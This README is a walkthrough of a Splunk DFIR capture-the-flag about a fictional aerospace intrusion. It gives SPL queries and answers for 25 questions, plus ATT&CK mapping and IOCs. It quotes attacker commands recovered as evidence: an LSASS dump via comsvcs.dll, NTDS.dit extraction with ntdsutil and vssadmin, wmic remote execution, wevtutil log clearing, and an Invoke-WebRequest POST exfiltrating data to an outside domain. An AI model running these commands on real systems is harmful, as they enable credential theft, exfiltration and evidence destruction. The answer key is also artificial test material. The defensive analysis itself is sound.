# CTF — Splunk DFIR Investigation: "Haldric Aerospace"
### One Cleared Log → Full Domain Compromise & Avionics IP Theft

> A hands-on **Splunk (SPL)** threat-hunting CTF. It starts with a single anomaly — a Domain Controller Security log that was wiped under an admin's account — and reconstructs the entire intrusion backwards to patient zero and forwards to exfiltration, using targeted SPL against FortiGate, Windows Security, and Sysmon telemetry.

> **Platform:** Splunk
> **Query language:** SPL (Search Processing Language)
> **Index:** `mydfir-ctf8`
> **Timeframe scoped:** 2026-02-16 00:00 → 2026-03-07 23:59 UTC
> **Data sources:** `sourcetype=fgt_event` (FortiGate SSL-VPN) · `WinEventLog:Security` (EventCode 4688 / 4648 / 1102) · `Microsoft-Windows-Sysmon/Operational` (Event 1 / 3 / 22)
> **Questions answered:** 25 · **Devices:** 3

---

## 📋 Table of Contents

1. [The Case](#-the-case)
2. [Environment & Data Sources](#-environment--data-sources)
3. [Attack Chain Overview](#-attack-chain-overview)
4. [Investigation](#-investigation)
   - [Setup — Scoping the Data (Q1)](#setup--scoping-the-data)
   - [Phase 1 — Initial Access · VPN (Q13, Q12, Q15, Q14, Q11)](#phase-1--initial-access--vpn)
   - [Phase 2 — Execution & Discovery on the Foothold (Q10, Q16, Q17)](#phase-2--execution--discovery-on-the-foothold)
   - [Phase 3 — Credential Access · LSASS (Q7, Q8, Q9, Q6)](#phase-3--credential-access--lsass)
   - [Phase 4 — Lateral Movement (Q4, Q5, Q18, Q22)](#phase-4--lateral-movement)
   - [Phase 5 — Domain Compromise · NTDS Theft (Q19, Q20, Q21)](#phase-5--domain-compromise--ntds-theft)
   - [Phase 6 — Collection & Exfiltration (Q23, Q24, Q25)](#phase-6--collection--exfiltration)
   - [Phase 7 — Defense Evasion · Anti-Forensics (Q2, Q3)](#phase-7--defense-evasion--anti-forensics)
5. [Final Report — The Four Questions](#-final-report--the-four-questions)
6. [Incident Posture](#-incident-posture)
7. [MITRE ATT&CK Mapping](#-mitre-attck-mapping)
8. [Key IOCs](#-key-iocs)
9. [SPL Query Reference](#-spl-query-reference)

---

## 🏢 The Case

**The scenario:** I'm the Tier 1 SOC analyst on the morning shift for **Haldric Aerospace**, a mid-size avionics contractor. On Friday **6 March 2026 at 08:50**, an administrator named **Markus Richter** walks over to my desk. The **Security event log on the Domain Controller is basically empty** — there's a single entry saying it was cleared, **under his account**.

> *He never cleared it.*

**Objective:** identify **what happened**, **when it first occurred**, and the **next steps** to reduce the risk of it happening again.

That one cleared log is the loose thread. Pulling on it — working outward from the tampering event through the VPN, the workstations, and the servers — unravels a full intrusion: a compromised VPN account, credential theft, lateral movement to the Domain Controller, extraction of the entire Active Directory database, and the theft of Haldric's most sensitive asset: the **A400M navigation-system engineering data**.

**Assets in scope:**

| Host | Role | Notes |
|------|------|-------|
| `WS-ENG04` | Engineering workstation | Attacker foothold / hands-on-keyboard (`10.1.70.42`) |
| `SRV-DC01` | Domain Controller | NTDS.dit extraction target; log cleared |
| `SRV-FILES02` | File server | A400M avionics data — theft target; log cleared |
| `vpn-haldric-aero` | FortiGate SSL-VPN | `FG201FTK22900456` — initial access path |

**Accounts:**

| Account | Role in the intrusion |
|---------|-----------------------|
| `s.brandt` | Compromised VPN account; the identity that *executed* everything on `WS-ENG04` |
| `m.richter` | Privileged account; creds dumped from LSASS and used *against the servers* (and named on the cleared logs) |

---

## 🗄️ Environment & Data Sources

All searches run against Splunk index **`mydfir-ctf8`**, scoped to **2026-02-16 → 2026-03-07 UTC**.

| Source | Contains |
|--------|----------|
| `sourcetype=fgt_event` (`subtype=vpn`) | FortiGate SSL-VPN — `ssl-login-fail`, `ssl-login-succ`, `tunnel-up`, `tunnel-down`, `remip`, `tunnelip` |
| `WinEventLog:Security` — **4688** | Process creation (command lines) |
| `WinEventLog:Security` — **4648** | Logon using explicit credentials |
| `WinEventLog:Security` — **1102** | Security audit log cleared |
| `Microsoft-Windows-Sysmon/Operational` | Process (1), network (3), DNS (22) telemetry |

> **Timestamp note:** the FortiGate is on CET (`tz=+0100`); Splunk `_time` is normalised to **UTC**. All times below are UTC. Mind the AM/PM trap on the log-clear events — the raw `_time` is authoritative (**03:33 / 03:49 UTC**, not 15:33 / 15:49).

> **Reading order:** the CTF was solved *in reverse* — starting from the cleared DC log (Q2) and working back to patient zero, then forward again to exfiltration. Below, the findings are re-ordered into **attack-chronological phases** for clarity, but every question keeps its **official CTF number (Q1–Q25)**, so the numbers deliberately run out of sequence within a phase.

---

## 🔗 Attack Chain Overview

```
  EXTERNAL (Tor 185.220.101.34 · VPS 45.153.160.88 · 91.234.33.126)
        │  compromised VPN creds for s.brandt
        ▼
  FortiGate SSL-VPN ── tunnel IP 10.1.96.114 ──► [WS-ENG04]  (foothold, acct: s.brandt)
        │
        ├─ systeminfo                                        (Discovery — T1082)
        ├─ net group "Domain Admins"/"Enterprise Admins" /dom (T1069.002)
        ├─ tasklist → find lsass PID 628
        ├─ rundll32 comsvcs.dll MiniDump 628 → sys_diag.dmp  (LSASS — T1003.001)
        │        └─► recovers m.richter : Haldric2025SecIT
        │
        ▼ lateral movement with m.richter creds (WMIC + C$)
        │
   ┌────┴─────────────────────────────┐
   ▼                                    ▼
[SRV-DC01]  (Domain Controller)     [SRV-FILES02]  (File server — final target)
   ├─ net use \\SRV-DC01\C$             ├─ net use \\SRV-FILES02\C$
   ├─ ntdsutil ifm create full         ├─ Compress-Archive A400M_NavSys
   │     → C:\Windows\Temp\McAfee_Logs  │     → win_update_kb5034.zip
   ├─ vssadmin create shadow /for=C:    ├─ certutil -encode → .b64
   └─ wevtutil cl Security (1102) ◄─────┴─ wevtutil cl Security (1102)
                                              │
                                              ▼ back to WS-ENG04
                                   Invoke-WebRequest POST .b64
                                   → https://cdn-telemetry.cloud-endpoint.net   (Exfil — T1041/T1567)
```

---

## 🔍 Investigation

Each entry gives the official question, its format, why it matters to a SOC analyst, the SPL used, and the confirmed answer.

---

### Setup — Scoping the Data

---

#### Q1 — What is the index for this CTF?
**Format:** *(setup)*

**Why this matters:** every hunt begins by confirming *where* the data lives and *what window* you're working in. Getting the index and timeframe right up front stops you chasing events outside the incident.

```spl
index=mydfir-ctf8 earliest="02/16/2026:00:00:00" latest="03/07/2026:23:59:59"
| stats count by sourcetype
```

**✅ Answer:** `mydfir-ctf8`  (window: Feb 16 00:00 → Mar 7 23:59 UTC)

---

### Phase 1 — Initial Access · VPN

> *The starting artifact (the cleared log) pointed at `m.richter`, but the trail led back through `WS-ENG04` to the VPN. This phase finds patient zero: how the attacker first got in.*

---

#### Q13 — Timestamp (UTC) of the attacker's first footprint in the entire dataset?
**Format:** `YYYY-MM-DD HH:MM:SS`

**Why this matters:** the earliest malicious event anchors the whole timeline and answers the boss's first question — *"when did this start?"* Attackers usually **fail before they succeed**; that first failure is often true patient zero.

```spl
index=mydfir-ctf8 sourcetype=fgt_event user="s.brandt" remip!="88.153.72.14"
| sort +_time
| head 1
| table _time action remip reason
```

**✅ Answer:** `2026-02-19 23:47:12` — a **failed** SSL-VPN login (`reason=sslvpn_login_invalid_credential`) from `185.220.101.34`, ~27 minutes before the first success.

---

#### Q12 — SOURCE (external) IP of the FIRST successful unauthorised VPN login as s.brandt?
**Format:** IPv4

**Why this matters:** the first *successful* auth is the moment of compromise — everything after it is attacker-controlled.

```spl
index=mydfir-ctf8 sourcetype=fgt_event user="s.brandt" action="ssl-login-succ" remip!="88.153.72.14"
| sort +_time
| head 1
| table _time remip
```

**✅ Answer:** `185.220.101.34` — a **Tor exit node**, at `2026-02-20 02:14:00 UTC`.

---

#### Q15 — s.brandt's LEGITIMATE residential source IP?
**Format:** IPv4

**Why this matters:** you can't spot the attacker until you know what "normal" looks like. Establishing **known-good** lets you scope the real user *out* and attribute the rest confidently.

```spl
index=mydfir-ctf8 sourcetype=fgt_event subtype=vpn user="s.brandt" action="ssl-login-succ"
| stats count by remip
| sort -count
```

**✅ Answer:** `88.153.72.14` — the stable, high-volume residential IP (22 sessions), always assigned tunnel IP `10.20.10.101`. This is the filter (`remip!="88.153.72.14"`) that isolates the attacker everywhere else.

---

#### Q14 — How many DISTINCT external source IPs did the attacker log in from?
**Format:** integer

**Why this matters:** distinct infrastructure sizes the actor's footprint and produces a clean block-list.

```spl
index=mydfir-ctf8 sourcetype=fgt_event subtype=vpn user="s.brandt" remip!="88.153.72.14"
| stats dc(remip) as distinct_attacker_ips
```

**✅ Answer:** `3` — `185.220.101.34` (Tor), `45.153.160.88`, `91.234.33.126`. All three were assigned the same internal tunnel IP.

---

#### Q11 — Internal tunnel IP assigned to the attacker's s.brandt sessions?
**Format:** IPv4

**Why this matters:** the tunnel IP is the attacker's true **on-network address**. Any internal log sourced from it is attacker activity — a powerful pivot.

```spl
index=mydfir-ctf8 sourcetype=fgt_event subtype=vpn user="s.brandt" action="tunnel-up"
| stats count values(tunnelip) as tunnel_ip by remip
```

**✅ Answer:** `10.1.96.114` (vs the legit user's `10.20.10.101`).

---

### Phase 2 — Execution & Discovery on the Foothold

> *With VPN access as `s.brandt`, the attacker lands on `WS-ENG04` and gets oriented before doing damage.*

---

#### Q10 — Per the process-creation events, which user account executed the attacker's commands on WS-ENG04?
**Format:** username

**Why this matters:** separates the **operating identity** (who's at the keyboard) from the **stolen identity** (whose creds get abused later). Attribution drives which account you disable first.

```spl
index=mydfir-ctf8 host="WS-ENG04" EventCode=4688 process="*comsvcs*"
| table _time user process
```

**✅ Answer:** `s.brandt` — the VPN account is the hands-on-keyboard identity on the workstation. (`m.richter`'s creds come *later*, used only against the servers.)

---

#### Q16 — FIRST host-recon command the attacker ran after gaining the foothold?
**Format:** command

**Why this matters:** the first discovery command marks the shift from *access* to *action-on-objectives* and reveals the operator's playbook.

```spl
index=mydfir-ctf8 host="WS-ENG04" EventCode=4688 user="s.brandt"
    (process="*systeminfo*" OR process="*whoami*" OR process="*ipconfig*" OR process="*net *" OR process="*tasklist*")
| sort +_time
| head 1
| table _time process
```

**✅ Answer:** `systeminfo` at `2026-02-20 02:14:30 UTC` — 30 seconds after login (System Information Discovery, **T1082**).

---

#### Q17 — Which two privileged AD groups did the attacker enumerate?
**Format:** Group1, Group2

**Why this matters:** enumerating the top AD groups shows intent to reach domain/forest control and tells you which accounts they'll hunt for next.

```spl
index=mydfir-ctf8 host="WS-ENG04" EventCode=4688 process="*net*group*"
| table _time process
| sort +_time
```

**✅ Answer:** `Domain Admins, Enterprise Admins` (`net group "..." /dom`, 2026-02-23 — **T1069.002**).

---

### Phase 3 — Credential Access · LSASS

> *A single foothold isn't enough. The attacker dumps LSASS to steal a more privileged account and unlock the rest of the network.*

---

#### Q7 — What did the attacker execute to dump credentials on WS-ENG04?
**Format:** Full command line

**Why this matters:** LSASS dumping is the pivot from one box to broad compromise. The exact command names the technique **and** the evidence file to hunt for.

```spl
index=mydfir-ctf8 host="WS-ENG04" (EventCode=4688 OR EventCode=1) process="*comsvcs*"
| table _time host user process
```

**✅ Answer:**
```
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 628 C:\Windows\Temp\sys_diag.dmp full
```
Abusing the signed built-in `comsvcs.dll` via `rundll32` to dump LSASS (**T1003.001**). Preceded at `02:38:48` by `tasklist /fi "imagename eq lsass.exe"` to find the PID. (`2026-02-26 02:40:02 UTC`)

---

#### Q8 — What PID did the MiniDump command dump?
**Format:** integer

**Why this matters:** confirms **LSASS** was the target (not some unrelated process) — i.e. this really is credential theft.

Same search as Q7. **✅ Answer:** `628` (the PID of `lsass.exe`).

---

#### Q9 — Where on disk was the credential dump written?
**Format:** file path

**Why this matters:** the output file is physical evidence and an IOC to sweep the estate for.

Same search as Q7. **✅ Answer:** `C:\Windows\Temp\sys_diag.dmp` — named to blend in as a routine "system diagnostic."

---

#### Q6 — What is m.richter's plaintext password, visible in the process arguments?
**Format:** string

**Why this matters:** cleartext creds in a command line are a catastrophic OPSEC failure by the attacker — and a gift to the defender for scoping reuse.

```spl
index=mydfir-ctf8 host="WS-ENG04" process="*wmic*" process="*/password:*"
| table _time process
| sort +_time
```

**✅ Answer:** `Haldric2025SecIT` — passed in the clear via the WMIC `/password:` flag when the stolen `m.richter` creds were used against the servers.

---

### Phase 4 — Lateral Movement

> *Armed with `m.richter`'s credentials, the attacker leaves `WS-ENG04` and reaches into the servers.*

---

#### Q4 — Event 4648 logons where m.richter's creds were used against the servers — what SOURCE host did they originate FROM?
**Format:** hostname

**Why this matters:** Event 4648 (logon with **explicit** credentials) reveals *where* stolen creds are being wielded from — pinpointing the operator's launch pad.

```spl
index=mydfir-ctf8 source="WinEventLog:Security" EventCode=4648 "m.richter"
    (Target_Server_Name="SRV-DC01*" OR Target_Server_Name="SRV-FILES02*")
| stats count by host, Subject_Account_Name
```

**✅ Answer:** `WS-ENG04` — subject `s.brandt`, wielding `m.richter`'s explicit creds against both servers.

---

#### Q5 — What command-line tool executed those remote commands with m.richter's creds?
**Format:** tool name

**Why this matters:** the execution vector (WMIC vs PsExec vs WinRM) drives both the containment action and the detection you build.

```spl
index=mydfir-ctf8 source="WinEventLog:Security" EventCode=4648 host="WS-ENG04" user="m.richter"
| stats count values(Target_Server_Name) as targets by Process_Name
```

**✅ Answer:** `wmic.exe` — remote WMI execution (**T1047**), e.g. `wmic /node:"SRV-DC01" /user:"m.richter" /password:"..." process call create "..."`.

---

#### Q18 — Using m.richter's creds, the FIRST server the attacker authenticated to over its C$ admin share?
**Format:** hostname

**Why this matters:** admin-share (C$) access maps the lateral path and its order — showing which objective the attacker went for first.

```spl
index=mydfir-ctf8 host="WS-ENG04" process="*net*use*C$*" process="*m.richter*"
| sort +_time
| head 1
| table _time process
```

**✅ Answer:** `SRV-DC01` (`net use \\SRV-DC01\C$`, `2026-02-28 03:14:59 UTC` — SMB/Admin Shares, **T1021.002**).

---

#### Q22 — The attacker pivoted to a SECOND server with m.richter's creds. Which host?
**Format:** hostname

**Why this matters:** completes the lateral-movement map and points to where the sensitive data lived.

```spl
index=mydfir-ctf8 host="WS-ENG04" process="*net*use*C$*" process="*m.richter*"
| stats count by _time, process
```

**✅ Answer:** `SRV-FILES02` (`net use \\SRV-FILES02\C$`, `03:16:05 UTC` — ~1 minute after the DC).

---

### Phase 5 — Domain Compromise · NTDS Theft

> *On the Domain Controller, the attacker goes for the crown jewels of identity — the entire Active Directory database.*

---

#### Q19 — What utility did the attacker use to extract the Active Directory database?
**Format:** tool name

**Why this matters:** NTDS.dit extraction = theft of **every** domain password hash. The tool is both a detection and a severity multiplier.

```spl
index=mydfir-ctf8 host="SRV-DC01" (process="*ntdsutil*" OR process="*ntds.dit*")
| table _time user process
| sort +_time
```

**✅ Answer:** `ntdsutil` — via the **Install-From-Media (IFM)** technique: `ntdsutil "ac i ntds" ifm "create full ..."` (**T1003.003**).

---

#### Q20 — The NTDS extract was written into a masquerade folder. What was that folder path?
**Format:** path

**Why this matters:** the staging folder is a high-value IOC and shows the attacker's disguise tradecraft.

```spl
index=mydfir-ctf8 host="SRV-DC01" process="*ntdsutil*ifm*"
| rex field=process "create full (?<ifm_path>[^\" ]+)"
| table _time ifm_path process
```

**✅ Answer:** `C:\Windows\Temp\McAfee_Logs` — disguised as legitimate McAfee AV logs (Masquerading, **T1036**). `ntds.dit` + the SYSTEM hive were written here.

---

#### Q21 — What command created a volume shadow copy on the DC to support the extraction?
**Format:** command

**Why this matters:** the shadow copy is the *method* used to read the locked live database — a classic NTDS-theft enabler and a strong DC detection.

```spl
index=mydfir-ctf8 host="SRV-DC01" process="*vssadmin*shadow*"
| table _time user process
```

**✅ Answer:** `vssadmin create shadow /for=C:` (`2026-02-28 03:22:59 UTC`) — snapshots C: so `ntds.dit` can be read despite the lock.

---

### Phase 6 — Collection & Exfiltration

> *The actual objective: steal Haldric's A400M avionics engineering data and get it off the network.*

---

#### Q23 — On SRV-FILES02, what sensitive directory did the attacker archive for theft?
**Format:** path

**Why this matters:** this is the **objective** of the whole intrusion — the data they came for. It drives breach scope and notification duties.

```spl
index=mydfir-ctf8 host="SRV-FILES02" process="*Compress-Archive*"
| table _time process
| sort +_time
```

**✅ Answer:** `C:\Engineering\Avionics\A400M_NavSys` — A400M navigation-system engineering data (Archive Collected Data, **T1560.001**).

---

#### Q24 — What was the staged archive filename the attacker created?
**Format:** filename

**Why this matters:** links collection → encoding → exfil, and gives one more disk IOC to hunt.

```spl
index=mydfir-ctf8 host="SRV-FILES02" process="*Compress-Archive*"
| rex field=process "-DestinationPath '(?<archive>[^']+)'"
| table _time archive
```

**✅ Answer:** `win_update_kb5034.zip` — masquerading as a Windows Update package in `C:\Windows\Temp`. It was then `certutil -encode`'d to `win_update_kb5034.b64`.

---

#### Q25 — What external domain did the attacker POST the encoded archive to?
**Format:** domain

**Why this matters:** the exfil destination **confirms data left the network** and is the single most important IOC to block and hunt historically.

```spl
index=mydfir-ctf8 process="*POST*"
| table _time host process
| sort +_time
```

**✅ Answer:** `https://cdn-telemetry.cloud-endpoint.net`
```
Invoke-WebRequest -Uri https://cdn-telemetry.cloud-endpoint.net -Method POST -InFile C:\Windows\Temp\win_update_kb5034.b64 -UseBasicParsing
```
Exfiltration over web service (**T1041 / T1567.002**), launched from `WS-ENG04` at `2026-03-02 01:19:15 UTC`.

---

### Phase 7 — Defense Evasion · Anti-Forensics

> *The original anomaly. Everything above led here — the log clears that put `m.richter`'s name on the crime and started the investigation.*

---

#### Q2 — On the domain controller, which account cleared the Security audit log?
**Format:** username

**Why this matters:** Event 1102 (log cleared) is a high-fidelity tampering signal. Because Splunk already **ingested** the events, the "cleared" evidence survives — and the clearing account is itself an IOC.

```spl
index=mydfir-ctf8 source="WinEventLog:Security" EventCode=1102 host="SRV-DC01*"
| table _time host EventCode Message
```

**✅ Answer:** `m.richter` — cleared the DC Security log at `2026-02-28 03:49:24 UTC` via `wevtutil cl Security` (run remotely through WMIC). The tampering wasn't spotted until the following Friday (6 Mar), when the real Markus Richter reported a log he never touched — *his account, not his action.* (Clear Windows Event Logs, **T1070.001**.)

---

#### Q3 — The same account cleared the Security log on a second server. Which server?
**Format:** hostname

**Why this matters:** shows the log-clearing was a **sweep** across multiple hosts, not a one-off — reinforcing deliberate, capable tradecraft.

```spl
index=mydfir-ctf8 source="WinEventLog:Security" EventCode=1102
| stats min(_time) as cleared_at by host
| sort +cleared_at
```

**✅ Answer:** `SRV-FILES02` — cleared at `03:33:51 UTC`, ~15 minutes **before** the DC. The attacker wiped the file server first, then the DC on the way out.

---

## 📊 Final Report — The Four Questions

### 🔍 Who gained access, and how?

An external actor compromised the domain VPN account **`s.brandt`** and authenticated to the FortiGate SSL-VPN from **rotating anonymised infrastructure** — a Tor exit node (`185.220.101.34`) and two VPS IPs (`45.153.160.88`, `91.234.33.126`) — never from the user's legitimate residential IP (`88.153.72.14`). First **failed** login: `2026-02-19 23:47:12`; first **success**: `2026-02-20 02:14:00`. All attacker sessions were assigned internal tunnel IP `10.1.96.114`. There was **no MFA** stopping a stolen-password login.

### 🔍 Which accounts and systems did they touch?

From the foothold on **`WS-ENG04`** (as `s.brandt`), the actor dumped LSASS to recover the privileged account **`m.richter`** (`Haldric2025SecIT`), then used those credentials via **WMIC** and **C$ admin shares** to reach the **Domain Controller `SRV-DC01`** and the **file server `SRV-FILES02`**.

### 🔍 What did they steal — and did it leave the network?

Two crown-jewel thefts:
- **Full AD database** — `ntdsutil` IFM + `vssadmin` shadow copy extracted `NTDS.dit` on `SRV-DC01` into `C:\Windows\Temp\McAfee_Logs` (every domain hash).
- **A400M avionics engineering data** — `C:\Engineering\Avionics\A400M_NavSys` was archived (`win_update_kb5034.zip`), base64-encoded (`.b64`), and **confirmed exfiltrated** via HTTPS POST to `cdn-telemetry.cloud-endpoint.net` on `2026-03-02 01:19:15 UTC`.

**Assessment: confirmed data breach** of defence-sensitive IP, plus total domain-credential compromise.

### 🔍 What did they do to hide it?

Masqueraded filenames throughout (`McAfee_Logs`, `sys_diag.dmp`, `win_update_kb5034.*`, `nav_cache.cab`), cleared the Security logs on both servers (Event 1102 via WMIC/`wevtutil`) — **under `m.richter`'s name** — and deleted staging files afterward.

---

## 🚨 Incident Posture

**Status: OPEN / ACTIVE — not contained.** The investigation (reconstruction) is complete, but the attacker still had access at the end of the data:

- `s.brandt` logins **kept succeeding** from attacker IPs **after** the exfil — last confirmed `2026-03-05 03:05 UTC` from the Tor exit — with **no lockout, reset, or eviction** anywhere in the telemetry.
- The dataset simply **ends** on `2026-03-06`. Log silence ≠ attacker removed.
- The stolen **NTDS.dit** gives durable re-entry (forged tickets / other accounts) even after `s.brandt` is reset.

**Treat as an active domain compromise** until the account is disabled, `krbtgt` is reset (twice), hosts are isolated/imaged, and the IOCs below are blocked.

---

## 🎯 MITRE ATT&CK Mapping

| Tactic | Technique (ID) | Evidence | Q |
|--------|----------------|----------|---|
| Initial Access | Valid Accounts (T1078) / External Remote Services (T1133) | VPN login as `s.brandt` from Tor/VPS | Q11–Q15 |
| Discovery | System Information Discovery (T1082) | `systeminfo` | Q16 |
| Discovery | Domain Group Discovery (T1069.002) | `net group "Domain Admins"/"Enterprise Admins" /dom` | Q17 |
| Discovery | Process Discovery (T1057) | `tasklist /fi "imagename eq lsass.exe"` | Q7 |
| Credential Access | LSASS Memory (T1003.001) | `rundll32 comsvcs.dll MiniDump 628` | Q7–Q9 |
| Credential Access | NTDS (T1003.003) | `ntdsutil ifm create full`; `vssadmin create shadow` | Q19–Q21 |
| Lateral Movement | SMB / Admin Shares (T1021.002) | `net use \\SRV-DC01\C$` / `\\SRV-FILES02\C$` | Q18, Q22 |
| Execution | WMI (T1047) | `wmic ... process call create` | Q4, Q5 |
| Collection | Archive Collected Data (T1560.001) | `Compress-Archive` of `A400M_NavSys`; `makecab` | Q23, Q24 |
| Defense Evasion | Masquerading (T1036) | `McAfee_Logs`, `win_update_kb5034.zip`, etc. | Q20, Q24 |
| Defense Evasion | Clear Windows Event Logs (T1070.001) | Event 1102 on both servers via `wevtutil` | Q2, Q3 |
| Defense Evasion | Obfuscated/Encoded Data (T1027 / T1140) | `certutil -encode` to base64 | Q24, Q25 |
| Command & Control | Multi-hop Proxy: Tor (T1090.003) | access via `185.220.101.34` | Q12 |
| Exfiltration | Exfil Over C2 / Web Service (T1041 / T1567.002) | `Invoke-WebRequest POST` to exfil domain | Q25 |

---

## 🔑 Key IOCs

| Type | Value | Context / Action |
|------|-------|------------------|
| IP (Tor exit) | `185.220.101.34` | Primary attacker source — **block** |
| IP (VPS) | `45.153.160.88` | Attacker source — **block** |
| IP (VPS) | `91.234.33.126` | Attacker source — **block** |
| Internal tunnel IP | `10.1.96.114` | Attacker's on-network VPN address |
| Domain | `cdn-telemetry.cloud-endpoint.net` | Exfil endpoint — **block at proxy/DNS** |
| Account | `s.brandt` | Compromised VPN / foothold account — **disable** |
| Account | `m.richter` | Compromised privileged account (`Haldric2025SecIT`) — **disable** |
| File | `C:\Windows\Temp\sys_diag.dmp` | LSASS dump output |
| Folder | `C:\Windows\Temp\McAfee_Logs` | NTDS.dit staging (masquerade) |
| File | `C:\Windows\Temp\win_update_kb5034.zip` / `.b64` | Archived + encoded A400M data |
| File | `C:\Windows\Temp\nav_cache.cab` | `makecab` of `nav_integration_spec_v4.2.docx` |

---

## 📋 SPL Query Reference

Every search uses the base filter `index=mydfir-ctf8`. Reusable patterns:

```spl
# Attacker VPN activity (exclude the legit residential IP)
index=mydfir-ctf8 sourcetype=fgt_event subtype=vpn user="s.brandt" remip!="88.153.72.14"
| table _time action remip tunnelip | sort +_time

# Process creation on a host, chronological
index=mydfir-ctf8 host="WS-ENG04" EventCode=4688 user="s.brandt"
| table _time process | sort +_time

# Explicit-credential logons (lateral-movement source)
index=mydfir-ctf8 EventCode=4648 "m.richter"
    (Target_Server_Name="SRV-DC01*" OR Target_Server_Name="SRV-FILES02*")
| stats count by host Subject_Account_Name

# Log-clearing (tamper detection)
index=mydfir-ctf8 source="WinEventLog:Security" EventCode=1102
| stats min(_time) as cleared_at by host | sort +cleared_at
```

---

## 📁 Repository Structure

```
ctf-splunk-investigation/
├── README.md                            ← This file — full 25-question walkthrough
├── Haldric_Incident_Report_CTF8.docx    ← Formal incident report (template format)
├── Haldric_Incident_Overview.pdf        ← 1-page stakeholder summary (non-technical)
├── PRESENTER-NOTES.md                    ← Speaker notes for the community talk
├── screenshots/                          ← (add annotated challenge screenshots)
└── queries/all-queries.spl              ← (optional) all SPL, copy-paste ready
```

---

*Splunk DFIR CTF — Haldric Aerospace — investigated July 2026. Telemetry: FortiGate + Windows Security + Sysmon in Splunk `mydfir-ctf8`. 25 questions answered.*
